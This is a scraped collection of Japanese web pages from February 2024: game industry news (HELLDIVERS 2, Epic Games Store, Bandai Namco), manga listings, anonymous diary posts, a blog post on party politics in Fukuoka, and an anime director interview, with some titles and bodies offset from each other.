ちいかわちゃん、どうして泣いているのだろう？局中法度、破っちゃったかな？

孫から送られてきたハチワレちゃんです

ちいかわ、なんとか踏みとどまって！敵前逃亡後ろ傷は土方副長に見つかったら切腹だから😣いいかい、沖田さんや斉藤さんの後ろにいるんだよ、怖くても逃げちゃダメだよ！RP
Title: ご当地コラボのちいかわ 、めっちゃ号泣してるけど服装で何をしでかしたか大体察してしまう「切腹不可避」

Link: https://www.gamespark.jp/article/2024/02/19/138562.html
Content: Arrowhead Game Studiosが開発し、SIEが発売するCo-opシューター『HELLDIVERS 2』のSteam版について、ピーク時の同時接続プレイヤー数が38万人を突破したことがわかりました。

『GTA V』も『Starfield』も超える！

本作は、次々終わりを知らず湧いてくる無数のムシ型の生物やオートマタなどと戦いながらミッションをこなすサードパーソンCo-opシューターです。プレイヤーはスーパーアースの特殊部隊・ヘルダイバーの一員として、管理民主主義を守り安住の地を求めて戦います。Game*Sparkでは先行プレイレポやレビューを掲載しています。

最大4人での協力プレイが楽しい本作ですが、発売からじわじわとプレイヤー数を伸ばし続けています。記事執筆時点ではピーク時38万8,754人ものプレイヤーが集まっており、40万人に到達しそうな勢いです（SteamDB）。

この記録は『Starfield』や『モンスターハンター：ワールド』、『グランド・セフト・オートV』などの人気作を抜き、歴代24位という記録を残しています。直近上位10位以内には『Fallout 4』や『Sons Of The Forest』、『Among Us』や『テラリア』などが並んでいます。

人気の一方サーバー問題も…開発元頑張り修正中

人気を集める一方で、サーバーが満員になったためマッチングができなかったり、場合によってはログインすらできないという問題が発生しているようです。

開発元のArrowhead Game Studiosは発売から連日修正に取り組んでおり、2月17日にはパッチ 01.000.009を配信。公式Discordでは上限人数を40万人に増員したという開発元からの報告も挙がっているようです。

『HELLDIVERS 2』は、PC（Steam）/PS5向けに配信中です。実はノーマークだった……という人も、友達を誘ってのプレイを検討してみてはいかがでしょうか。
Title: みんなが管理民主主義に夢中！『HELLDIVERS 2』Steam版同接プレイヤー数が38万人突破―『GTA V』『Starfield』も抜く大記録 | Game*Spark - 国内・海外ゲーム情報サイト

Link: https://anond.hatelabo.jp/20240219061155
Content: ■ ここ半年ぐらいでtwitterで増えた中華AI絵師について

プロフィールに「AI+加筆」という趣旨の英語または繁体字があり、日本語の日常ツイートはほとんどせず、淡々とAIポン出しでは出来ない高クオリティにまとめられたイラストを出す。自分のTLだとブルアカがよく流れてくる。

確証は無いが、あれらは中国のゲーム会社出身のイラストレーターじゃないかと思っている。

2023年のはじめ、既に中国では、生成AIで出力したものを整える社内イラストレーターという構図ができた上で、その人員カットが問題になっていたぐらいだし、その業務の中で優れた作画技能を持ちつつ生成AIを扱うことにも長けた絵描きが沢山生まれたことは想像に難くない。

しかし、中国のイラストコミュニティにもAI利用そのものに批判的な人間は多いので、twitterに逃げて来たのではないだろうか。

そうでもなければあの、「絵描きの目で監修されている」雰囲気は出せない。本邦のワナビに毛が生えたAI絵師とは明らかに加筆のレベルが違う。

日本人絵師コミュニティの「仕事では使えない(使ったことが知れたら同業or顧客の一部から滅多打ち)」な環境ではなかなか見られない、「十分な実力を持ったプロの絵描きが生成AIを使ったら」があれらのイラスト郡であるなら面白いなと思う。

ツイートシェア
Title: ここ半年ぐらいでtwitterで増えた中華AI絵師について

Link: https://www.famitsu.com/news/202402/18334706.html
Content: シリコンスタジオは、日野自動車からの依頼を受け、デザイン評価を目的とした走行シミュレーターを開発、提供したことを発表した。

広告

今回制作された走行シミュレーターは、米エピック・ゲームズによるゲーム開発エンジンであるUnreal Engine（アンリアルエンジン）を用いて開発されている。

Unreal Engineは、2022年に最新版となるUnreal Engine 5（UE5）が正式リリース。リアルな物理演算、描画を得意としており、その活用領域はゲーム開発にとどまらず、さまざまな分野で使われ始めているようだ。

※最新のアンリアルエンジン5.1について開発会社に訊いたインタビューは下記関連記事をチェック！

以下、リリースを引用

シリコンスタジオ、日野自動車にデザイン評価のための走行シミュレーターを開発・提供

実際の交通ルールや対向車の影響等を考慮した車両挙動をモデル化して実装

エンターテインメント業界を中心に、自動車、映像、建築など、さまざまな業界向けにデジタルコンテンツ関連ビジネスを展開するシリコンスタジオ株式会社（本社：東京都渋谷区、代表取締役社長：梶谷 眞一郎、東証グロース：証券コード3907、以下「当社」）は、日野自動車株式会社（本社：東京都日野市、代表取締役社長 CEO：小木曽 聡、以下「日野自動車」）に対し、デザイン評価を目的とした走行シミュレーターを開発、提供したことをお知らせします。

このたび当社が日野自動車の委託を受け開発、提供した走行シミュレーターは、米Epic Games社のゲームエンジン※「Unreal Engine（アンリアルエンジン）」を使用して開発されました。仮想空間で実際の交通ルールや対向車の影響などを考慮しながら走行する自車をデザイン評価することができるものです。

走行する車や建物、道路標識や信号機、横断歩道や停止線といった道路付属物など、自社開発による3Dモデルのアセットを用いて道路シーンを作成し、納品しました。その後、第2フェーズとして高速道路のサービスエリアを含むシーンも作成し、納品しています。

作成したシーンには、自動走行するための走行ルートパスと車両の挙動モデルを実装しました。そのため、自車と他車、並びに他車同士が衝突することなく物理シミュレーションによって自動走行する様子を確認することができるようになっています。

車両の挙動モデルは、衝突回避ブレーキの発動距離、停止後のブレーキ解除およびアクセルのタイミングなど、Unreal Engineのロジックを組み合わせています。さらに、車種ごとの特性に合わせて調整するなど、チューニングを繰り返すことで実現しました。

既存の多機能な交通シミュレーターよりも簡易的でありながら、時間帯による日照条件や天候変化の反映、コントローラーを使ったフリードライビングモードなども実装しています。これらは当社が長年にわたって培ってきたゲーム開発におけるリアルタイム3DCG技術の応用で実現したものです。

当社では今後もリアルタイム3DCG技術を活用したデジタルツインによる可視化によって、自動車業界をはじめとするさまざまな産業分野でのDX推進に貢献してまいります。



なお、このたびの走行シミュレーターの開発・提供にあたり、日野自動車の今井様より以下のコメントをいただいております。

当社では、商用車のデザイン開発において、CGやVRを活用したビジュアル評価に加えて、デザインの「使用体験」を早期に開発関係者と共有し、議論を活性化させることを目的とし、ゲームエンジンや走行シミュレーターの活用についても検討を進めてまいりました。

デザイン開発における走行シミュレーターには、高精細なビジュアル評価、使用体験に即した環境データ、対向車や天候といった動的要素の実現が必要と考え、自動車産業におけるゲームエンジンの活用やデザイン分野にも知見のあるシリコンスタジオ様にご協力いただき、様々なアドバイスをいただきながらデザイン開発に最適な走行シミュレーターを実現することができました。

また、ツールはパッケージされたものではなく、中身を閲覧可能なプロジェクト形式で提供いただきました。これにより、自社での機能追加やゲームエンジンの教育にも役立てられる利点がございます。

今回開発いただいたシミュレーターを活用し、当社のデザイン開発の精度が一層向上することを期待しております。シリコンスタジオ様のご協力に感謝し、より良い製品開発に向けて前進してまいります。

日野自動車株式会社 デザインセンター デジタルクリエイト1グループ 今井久嗣

※ゲームエンジン：コンピューターグラフィックスによるアプリケーションやコンテンツ開発において必要なライブラリやツールなどの機能がまとまったGUIベースの統合開発環境です。高品質な3Dグラフィックスを比較的簡単に作成できる仕組みが揃っているため、近年はゲームや映像コンテンツのみならず、自動車や建築、製造業などの産業分野で活用が進んでいます。米Unity Technologies社の「Unity」と、米Epic Games社の「Unreal Engine」が高いシェアを誇っています。

シリコンスタジオ株式会社

当社は、ゲームや映像制作スタジオ向けに加え、自動車、映像、建築など、さまざまな業界向けに3DCG技術等を提供する開発推進・支援事業と、クリエイター職の派遣・紹介に特化した人材事業の2つの事業を展開しております。企画、技術、人材、運営など、ゲーム企業が抱えるすべての課題をワンストップで解決できること、および、ゲーム業界で培った3DCG技術等を他業種にも展開できることが強みです。 ポストエフェクトミドルウェア『YEBIS』、リアルタイムレンダリングエンジン『Mizuchi』、リアルタイムグローバルイルミネーション『Enlighten』といった、高度な技術をゲーム制作現場に提供するシリコンスタジオのミドルウェアは、これまでワールドワイドで数多くのAAAタイトルに採用されてきました。また、Unreal EngineやUnityなどのゲームエンジンを活用した非エンターテインメント領域における案件に対し、コンサルティングから企画、設計、開発、運用まで、ワンストップで対応できるスキルと体制を有しています。

コンピューターグラフィックス（CG）は、無限の可能性を秘めています。

映像・エンターテインメント分野では表現の幅を拡げ、土木建築・自動車といった産業分野では、可視化やHMI（ヒューマンマシンインターフェイス）などに活用されています。AI・ディープラーニングの分野においても、学習データとしての活用が進み、その成果が評価され始めています。また、5Gのような高速大容量で低遅延を実現するネットワーク環境やクラウドの活用は、ユーザーエクスペリエンス（UX）にさらなる変革をもたらすでしょう。

私たちシリコンスタジオは、自社開発による数々のミドルウェアを有し、CGの黎明期から今日に至るまでCG関連事業に取り組み、技術力、表現力、発想力の研鑽を積み重ねてきました。それら3つの力を高い次元で融合させ、CGが持つ可能性を最大限に発揮させられること、それが私たちの強みです。

Ideas × Art × Technology

私たちはCG業界をリードするソリューションプロバイダーとして、お客さまの課題解決はもちろん、付加価値のあるアウトプットの提供をお約束いたします。
Title: シリコンスタジオ、アンリアルエンジンを用いた走行シミュレーターを開発・提供。ゲームにとどまらず、さらに活用領域の幅を広げるUE | ゲーム・エンタメ最新情報のファミ通.com

Link: https://shonenjumpplus.com/episode/9324074615349344785
Content: ラーメン赤猫

アンギャマン

<毎週月曜更新！最新2話無料>TVアニメ化決定!! 人間のいない、猫だけが営むラーメン屋に面接に来た珠子。猫の店長に猫好きか聞かれ、珠子は正直に犬派と答えるとあっさり採用される。しかし仕事内容はラーメン屋ではなく、猫のお世話係で…!? [JC7巻3/4発売]
Title: [第90話]ラーメン赤猫 - アンギャマン | 少年ジャンプ＋

Link: https://automaton-media.com/articles/newsjp/20240217-282899/
Content: Epic Gamesは2月16日、公式サイトにて「2023年 Epic Games Storeの総括」を公開した。PCユーザーからの総売上が前年比で16％増となったことなど、2022年と比べて成長を見せたことが伝えられている。

2023 was another great year of growth for the Epic Games Store, and we're excited for what's coming next here in 2024!



Thank you for being a part of our expanding community of developers, publishers, players & creators.



Check out our 2023 Year in Review: https://t.co/dzvbma3NiP pic.twitter.com/tPm6Aec9sE — Epic Games Store (@EpicGames) February 16, 2024



Epic Gamesは、同社が運営するEpic Gamesストアの収益やユーザー数などを振り返る総括を毎年おこなっている。今回発表された「2023年 Epic Games Storeの総括」によると、Epic GamesストアのPCユーザー数は2022年から4000万人増加し、2億7000万人を超えたという。また2023年のデイリーアクティブユーザー数は、ピーク時には3610万人に到達し、マンスリーアクティブユーザー数は2022年の6800万人を上回る7500万人に達していたとのこと。

なお発表によれば、2023年には約1300本の新作PCタイトルがEpic Gamesストアに登場し、現在ストア上では2900本以上のタイトルが提供されているという。そしてプレイヤーの支出額と利用度に基づき、2023年度の人気タイトルがエピック/レジェンド/ミシックに区分分けされ、計20本紹介されている。

人気タイトルではPC版がEpic Gamesストア独占、あるいはSteamでは配信されていない『Fall Guys』『原神』といった人気のライブサービス作品がラインナップ。またPC版がEpic Gamesストア独占配信となっている『Alan Wake 2』なども名を連ねている。同作はThe Game Awardsにて複数の部門を受賞するなど、昨年のアワードで高い評価を受けたタイトルのひとつ。昨年末時点で開発元Remedy Entertainmentの作品史上最速で売上100万本を突破し、2月には売り上げが130万本を突破したことも伝えられている。





そうした人気タイトルの好調なセールスもあってか、Epic Gamesストアでの2023年のPCユーザーからの売上が前年比16％増となる9億5000万ドル（約1420億円）を記録したとのこと。2022年は2021年比で2％の減少を見せていたため、2023年はふたたび成長に転じたことがうかがえる。一方で（Epic Gamesにとっての）サードパーティー製のゲームの売上は前年比13%減となる3億1000万ドル（約460億円）となったそうだ。独占タイトルが売上を支える傾向がより強まったこともうかがえる。

このほか毎週配布されている「無料ゲームプログラム」では、2023年を通して合計2000ドル（約30万円）以上に相当する86本の無料ゲームがユーザーに提供されたという。無料ゲームの取得数は合計5億8000万以上に達し、新規プレイヤーの獲得・拡大に繋がったとされている。

さらに、2023年にEpic Gamesストアに導入された機能についても振り返りがおこなわれている。昨年にはEpic Gamesストアで独占配信した場合に、最初の6か月間はデベロッパーが純利益の100％を受け取れる「EPICファーストラン」や、ストアでの販売を容易にするセルフパブリッシングツールの提供といった施策が登場。こうした仕組みも、先述の独占タイトルの売上比率アップに繋がったかたちかもしれない。





なお2024年にEpic Gamesストアに計画されている新機能も一部紹介。まず今年初頭には新たなダウンロードマネージャーが登場し、アップデートのタイミングの管理やダウンロードスケジュールの設定、キューの並べ替えなどが可能になるという。事前購入したゲームの事前ロードも可能になるとのこと。また意図的にオフライン状態を切り替えられる機能など、オフラインモードの大幅な改良も実施予定。ソーシャル機能の改善のほか、バンドル購入時にバンドル内のすでに所有コンテンツの価格が差し引かれる仕組みも用意されるそうだ。

またデベロッパーおよびパブリッシャーは、Epic Gamesストアにて独自のサブスクリプションサービスを提供可能になるシステムも登場予定。ユーザーはサブスクリプションの購入費でもEpic報酬を獲得可能となる見込みだ。ほか、1月に告知されていたとおり、EUではiOS向けの『フォートナイト』が“再リリース”予定で、同じくiOS向けのEpic Gamesストアアプリを通して配信される予定とのこと（関連記事）。

ちなみに過去のEpic Games対Apple、およびEpic Games対Googleの裁判においては「Epic Gamesストアが赤字続きである」といった証言もおこなわれていた（関連記事）。この原因のひとつとして、Epic Gamesがサードパーティー製のゲームの無料配布、独占契約に大きな予算を投じていることがあると見られる。ただし今回の発表では前年比での収益が増加。特に独占タイトルの好調な売れ行きも示され、無料配布や独占契約に関する方針が一定の成果を上げている傾向も垣間見える。他方、EU向けには年内にiOS向け展開が予定されており、ほかの地域でのモバイル向けの展開が今後どうなるかは注目されるところだろう。
Title: Epic Gamesストア、2023年は売上1400億円以上。独占タイトルの好調もあってか成長に転じる - AUTOMATON

Link: https://shonenjumpplus.com/episode/9324074615349361768
Content: ログイン

メールアドレスまたはパスワードが正しくありません



※パスワードはアプリ版と共通化されました。詳しくはこちらからご確認ください。
Title: [第三十四話]キョンシーX - 倉薗紀彦 | 少年ジャンプ＋

Link: https://shonenjumpplus.com/episode/9324074615349343911
Content: 正反対な君と僕

阿賀沢紅茶

<隔週月曜更新>空気を読んじゃう元気女子・鈴木が惹かれたのは、自分の意見をはっきり言える物静か男子・谷くん。大好評の読切が連載化！付き合った2人が楽しめる！共感マックスの等身大ラブコメ、ここに開幕！ [JC6巻3/4発売]
Title: [番外編2]正反対な君と僕 - 阿賀沢紅茶 | 少年ジャンプ＋

Link: https://togetter.com/li/2316248
Content: ■マンガ解説

埼玉県民もそうでない人も必読!! ご当地ほのぼのコメディ♪埼玉県は行田市、自分に自信が持てない白鳥小鳩と何かとポジティブな姫宮アグリ、そして東京から転校してきた東上みなとの女子高生トリオが、ご当地ネタをからめつつも、誰もが経験する青春を、謳歌する。第1話では、埼玉貧乳問題に迫る3人だが――。
Title: 『埼玉県民が軽い気持ちで浦和のデパートに行ったら価格に圧倒されて撃沈した話』埼玉の女子高生ってどう思いますか？ ※マンガ解説付き

Link: https://jp.ign.com/tekken-8/73520/news/5
Content: バンダイナムコは、開発体制の変更に伴い、開発中の5タイトル以上のゲームを開発中止にしたと発表した。

同社は最新の決算説明会の質疑応答にて、仕掛品（製造途中の製品）については評価に関する社内ルールに則り処分を決定しており、開発中のタイトルについても5タイトル以上を開発中止としたと回答。また、開発を進めるための基準をより厳しく設定し、タイトルの絞り込みや開発費の計上方法を変更したという。これに伴い技術研究費が年初の想定より多く発生したほか、ゲーム開発の長期化により投資から回収までの時間も長くなっているため、タイトルの絞り込みなどを行うそうだ。

なお、『ELDEN RING』のDLCの開発は継続中で、「ドラゴンボール」の新作ゲームも開発中だ。決算説明会後には、同社の業績不振は不採算なゲームによるものだと説明していた。そうしたゲームの一つとして可能性が高いのは、バンダイナムコがAmazon Gamesを海外パブリッシャーに迎えたオンラインアクションRPG『BLUE PROTOCOL』だ。2023年に日本で正式サービスが開始されたが、ほかの地域ではまだ開始されていない。

だが明るい話題もある。『鉄拳8』の販売本数は200万本を突破しており、来期はリピート販売への貢献を見込んでいるとのことだ。

バンダイナムコは、ほかにも『リトルナイトメア3』や『SAND LAND』などを2024年にリリースする予定だ。ホラーアンソロジー『The Dark Pictures Anthology: Directive 8020』と『ドラゴンボール Sparking! ZERO』の発売日は未定だ。
Title: バンダイナムコが5タイトル以上のゲームを開発中止にしたと発表

Link: https://shonenjumpplus.com/episode/9324074615349361559
Content: 春の翌日

灰田よしひろ

<隔週月曜更新>ごく普通の女子校生・六花は高校２年生になった初日、自分の前の席に転校生が来ることを知る。しかしその転校生は六花が小学６年生の時に初めてキスをした相手である鈴蘭だった――。優しくて切ない女子×女子の青春ストーリー開幕！
Title: [連載終了告知]春の翌日 - 灰田よしひろ | 少年ジャンプ＋

Link: https://shonenjumpplus.com/episode/9324074615349345075
Content: ログイン

メールアドレスまたはパスワードが正しくありません



※パスワードはアプリ版と共通化されました。詳しくはこちらからご確認ください。
Title: [特別編80]デビィ・ザ・コルシファは負けず嫌い - 平方昌宏 | 少年ジャンプ＋

Link: https://shonenjumpplus.com/episode/9324074615349345714
Content: ゴダイゴダイゴ

コウノスケ

<隔週月曜更新>30年間、東京を怪獣から守ってきたおじさん巨大ヒーローは、経営不振に陥っていた！新世代の巨大ヒーローのイケメン化、エンタメ化、そして古きヒーローの老化…。時代の波に取り残された時代遅れヒーローに生きる道はあるのか!? [JC1・2巻発売中]
Title: [64話]ゴダイゴダイゴ - コウノスケ | 少年ジャンプ＋

Link: https://anond.hatelabo.jp/20240218110849
Content: ■ 最近の漫画家って名前覚えてもらえないよね

「鬼滅の作者」って呼ばれちゃうのは何となく分かるけど、「コナンの作者」は、ずっとやってるのにな。

手塚治虫さん、藤子不二雄さんはもちろん、さくらももこさんくらいまでは、一般に広く認知されてたと思うんだけど。

やなせたかしさんは、何で「アンパンマンの作者」じゃなくて、やなせたかしさんで通じるんだろう。

尾田栄一郎さんは「ワンピースの作者」って言わなくても通じるんだろうか。

ツイートシェア
Title: 最近の漫画家って名前覚えてもらえないよね

Link: https://m-dojo.hatenadiary.com/entry/2024/02/18/034817
Content: 民主青年同盟福岡県委員会の代表者会議が流会した。福岡では 共産党 県委員会青年学生対策部長による同盟員への パワハラ が既に問題化していた。代表者会議では民青県委員長による パワハラ を批判するビラが撒かれ、不信任動議が提出された。会は流会したものの同盟員たちはいまも改革を訴えている。

去年、福岡の同志から同じような話を聞いた事がありますね。 頑張っていらっしゃる党関係者も多い中、 内田裕県委員長の«権威的&家父長的手法»に対する不満も鬱積しつつあるようですね。

動画で見た限りの印象ですが、福岡県委員長は高圧的な感じの方みたいなので、査問、監視、処分なんて朝飯前？

www.jcp.or.jp

福岡県の７月度の到達は、党員８１人拡大、「赤旗」は日刊紙１９、日曜版４２の前進です。党員拡大で大会現勢回復をめざしましたが、回復・突破まで１９２人だったので残念ながら届きませんでした。しかし１カ月間の党員拡大が８０人を超えたのは、２０１７年７月以来、ちょうど６年ぶりとなります。もちろん今大会期では最高の入党決意数です。

福岡県には１２の地区委員会がありますが、この７月、すべての地区が入党者を迎えました。全地区入党は今年に入ってはじめてです。また読者拡大でも１地区を除いて日刊紙と日曜版ともに前進しました。党勢拡大で全地区の運動になってきたと実感しています。

（略）

第１の教訓――党機関での徹底した政治討議

一番の教訓は、県や地区の常任委員会など、党機関での８中総にもとづく徹底した政治討議を行ったことです。何といってもこれがすべての土台です。

福岡西部地区の常任委員会で、宮本百合子の「自信のあるなし」を議論したことがたいへん話題となりましたが、宮本百合子を討議したことが中心点だったわけではありません。福岡西部地区での政治討議の一番のポイントは、支配勢力が、党の綱領・規約、さらに党幹部という、いわば党の心臓部に切り込んできているときに、これを党勢拡大ではね返すのだという断固たる提起を地区委員長がやったこと、まさに党づくりの実践に結びつけて政治討議をやったところにあります。

私は、その地区常任委員会の討議に参加していましたからまざまざと覚えているのですが、田中美由紀地区委員長、若き地区委員長なのですが、彼女の断固たる提起、わが党の心臓部への攻撃が行われているときに、それに対して１３０％の党づくりで応えていく、そのためには毎月８割の支部が入党者を迎えること、毎月３７人の党員拡大が求められているのだ、みなさんよろしいですかと、鬼気迫る提起がされました。

緊迫した雰囲気といいますか、ピーンと張りつめた状況のなかで、１人のベテランの常任委員が苦しそうに手をあげて「いいですか」と発言を求めたんです。そして「自信ありません。そんな数やったことないです。とても自信ありません」と発言しました。「そんなのできませんよ」という軽い発言ではけっしてありませんでした。田中地区委員長の提起を受け止めて真剣に考えての発言でした。

すると別のベテランの常任委員が…（略）
Title: 福岡の共産党・民青周辺で何が起きているのか？／紙屋高雪氏のジャンプラ漫画評（漫画評論ですよ！） - INVISIBLE D.　ーQUIET & COLORFUL PLACE-

Link: https://anond.hatelabo.jp/20240217184402
Content: ■ 全巻買ったのに途中で読み進めるのを躊躇している漫画と当該シーン

経緯

何かで漫画を知り、kindleの試し読みをする、面白い、買う、1巻読み終わる、2巻買う、読む、3巻買う、面白すぎるので既刊すべて購入、読み進める、どこかで引っ掛かる、放置

皆さんに頼みたいこと

俺が続きを読めるようにプレゼンしてくれ。ネタバレしない程度に（例：「猿の惑星は地球！」的なやつはやめてよ）。トラックバックないしコメントで、俺の心を動かすものがあれば読む。別記事にて、読んだ感想も書こうではないか。

7巻くらいかな。イヅツミという猫人間（女？）が出てくるんだが、それがまあウザい。アイスゴーレムだったかな、そこで活躍したあたりまで読んでいる。読めなくなったのは（単に別の読みたいのを読み進め始めた、とか仕事が忙しくなった、とかのタイミングの問題もあるが）、なんかこいつの加わった一団は見たくないな～揉めそうだな～って感じ。ある程度まとまった集団に異物が入ってきた時のあの変な感じっていうのかな。気まずさ。

10巻くらいかな、あの救った少佐（だっけ？）と、どこかに上陸するじゃん、んでそいつがなんかはぐれた元の人たちと合流して、良からぬことを考えるじゃん。あれ、違うな、読んだのがかなり昔で記憶があやふやだ。タイムスリップ組の船が盗まれそうになるんだったかな、いや、少佐が「やっぱ日本軍は負けないといけない」みたいに思うシーンだったかな、とにかくあのあたりで「うわ～やばい展開～ひ～」ってなって放置。

これまた10巻くらいで、なんか一行が洞窟の中に隠れてるんだけど、敵に見つかって爆撃受けまくるのよ。「ひ～見てられん～全員死ぬや～ん」ってなって放置。あと、イムリの設定がムズすぎて理解力が追いつかなくなり始めた、というのも放置理由の一つ。次作もビームで読んでるが、ほんと設定ムズいってか癖があるよな、あの作者。多分国語の点数良くないと理解できない。もちろん、俺は国語が一番苦手だった。

第一部で終わらせてくれよ～あの半グレの親分死んでおいてくれよ～まだ続くのかよ、どんな悲惨な境遇があの一家に待ち受けているというのだよ勘弁してくれよ、という感じ。第二部始まってすぐ、断念。

放置してたけど頑張って読んだやつ

「王様ランキング」・・・マイホームヒーローと似てるが、第二部始まっちゃって、これ以上誰も不幸になってほしくないよ～めでたしでええやん～と思って放置してたが頑張って読んだ。なんか裏切るやつ多くね？

「九条の大罪」・・・AV編がきつづぎて断念してたが頑張った。グロシーン多くてちょい後悔はしたが読んでよかった。これも王様ランキング同様、裏切るやつ多くね？

最後に

みんなも似た体験があったら教えてよ！

ツイートシェア
Title: 全巻買ったのに途中で読み進めるのを躊躇している漫画と当該シーン

Link: https://www.animatetimes.com/news/details.php?id=1707984808
Content: シリーズ累計3100万部突破の大人気後宮謎解きエンタテインメント『薬屋のひとりごと』のTVアニメが絶賛放送中！ とある大国の帝の妃たちが住む後宮を舞台に、そこで起こる事件や陰謀に巻き込まれる主人公・猫猫（マオマオ）の活躍が描かれています。

2024年1月6日から第2クール目がスタートした本作。今回、監督とシリーズ構成を手掛ける長沼範裕さんにインタビュー！ 全24話のテーマや各話に詰め込まれた細かな意図、あらゆる年齢層に見てもらうための作品作りについてのお話を伺いました。

無意識を刺激する作品作り

――監督のXでは各話のテーマが紹介されています。改めて全体を通してのテーマを教えてください。

長沼範裕監督（以下、長沼）：全体としては「親と子」です。あと普遍的な「生と死」もテーマに取り入れています。

――このふたつを軸に各話のテーマがあるんですね。

長沼：そうですね。各話を補完するようなテーマや見せ方を絡めて大きなテーマを強調する、といった作り方になっています。

――第2クールのテーマも変わりなく？

長沼：第1話〜第24話までの話として構成しているので変わらないです。変わったところとしては、第1話〜第12話までは“猫猫の側にカメラがある”という感覚だったんですが、第13話からは猫猫を取り巻く環境にスポットが当たっています。カメラが客観的になり、より群像の部分が強調されテーマがより多角的に濃く見える見せ方にしています。

――演出部分に変化も？

長沼：そうですね。第12話までは猫猫を軸に物語が進みましたが、第13話からは壬氏が入ってきます。そして彼の立場が故の事件が起こるんですが、それに猫猫が巻き込まれる構造になっています。第1話～第12話までは猫猫単体のイメージですが、第13話からは猫猫、壬氏、そのほかの人々が加わってより大きな事件が起き、猫猫以外のキャラの内面や芝居を深掘りする撮り方や見せ方に変えています。

――これまでは細かな絵の表現で感情などが表現されていました。第13話以降、これらも変わりなく？

長沼：もちろんです。全てを計算して作っていますし、個人の意見ですが、実写と違ってアニメは偶発的なものはないと思っています。今後もシチュエーションに合わせた画作りを含め、色、密度、音楽まで意識して作られたものになっているかなと。

――今後、作品の印象が変わることもありそうですね。

長沼：第1話～第12話で土台を作ったと思っています。視聴者の感覚が出来上がった上で第13話〜第24話を見てもらうことで、“これはこういう表現なんだ”と伝われば良いなと思っています。

――これまで、視聴者がまだ気付いていない仕掛けがあったり？

長沼：あると思います。例えば、第9話ですごく赤いシーンがありますが、その赤は「生と死」を表現していて。加えて、この表現は第7話後半の「毒見役の命なんて大したことがない」というセリフのアンサーでもあるんです。さらに、第7話の猫猫はなぜ壬氏の手を払ったのかという部分のアンサーにも繋がるわけで。直前の第6話であれだけ距離感を近づけていたのはこの落差を引き立てるためで、キャストさんにもそのように演じてくださいと伝えていました

――なるほど。

長沼：それらのアンサーとなる第9話に向かうまでに、第7話で回想を描いて、そして第8話では「生と死」を描く。そうすれば、今後描かれる猫猫の生い立ちに繋

がるエピソードを絡めた見せ方「多重」に繋がるんです。

第9話でそれらの結果が出てきましたが、その際、夕景が赤く染まっているのは「これ以上踏み込むのは危険」という危険信号の表現です。そこで壬氏は覚悟があるのか問われましたが、ここでは猫猫を追わないんです。そこからは赤い夕景や風景をほぼ使用してません。画面を見て目が痛いと思ったかもしれませんが（笑）、そんな色の演出をしていたり、ほかにも視覚や音の仕掛けをたくさん用意しています。

――気付いているけど意識しきれていない仕掛けがあるんですね。

長沼：それが一番の理想ですね。言葉や絵にするのはわかりやすいんですが、そこにどう深みを出すのか、何回も見てもらえるのか。それを考えたときに無意識を刺激することが大事になるんだと自分は思っています。

例えば、なんとなく怖い絵だな、と感じてもらえると頭に引っかかりができるんですね、そのあと引っかかりの答えを用意するとスッキリするんです。そうすると今までのセリフや表情の捉え方がガラリと変わるんです。そういう意味で視聴者の無意識の状態は意識しています。

あとは効果音。特に足し引きは大事で、本来は音を絶対に付けないといけない場面であえて抜いていたりします。

――言われてみればそういう場面があった気がします。

長沼：こちらで音を付けてしまうとイメージが固まってしまいますが、付けないことで見ている人には無意識にイメージした聴きたい音が聞こえるんです。全体を通してそのような引き算をしています。

――まさに計算された演出だったんですね。

長沼：そうですね。なぜだか不安や緊張を感じて意識して聞いてしまう、みたいな状況を意図的に作り上げていて。それは本来のアニメーションの醍醐味でもあると自分は思っています。
Title: アニメ『薬屋のひとりごと』は無意識を刺激する計算された一作／長沼範裕監督インタビュー | アニメイトタイムズ

